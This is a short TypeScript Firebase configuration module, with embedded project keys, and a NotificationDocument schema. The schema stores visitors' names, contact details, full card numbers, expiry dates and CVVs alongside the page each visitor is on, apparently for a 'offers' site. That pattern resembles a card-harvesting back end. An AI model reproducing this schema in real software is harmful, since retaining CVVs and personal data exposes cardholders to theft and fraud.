import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDuZOgfEFjvASG3dBPdRHWK86T8XdUZGho",
  authDomain: "offers-5d68f.firebaseapp.com",
  projectId: "offers-5d68f",
  storageBucket: "offers-5d68f.firebasestorage.app",
  messagingSenderId: "1066805562074",
  appId: "1:1066805562074:web:c76cbab71dfe771adbb3e3",
  measurementId: "G-CKV4KFRJWF"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
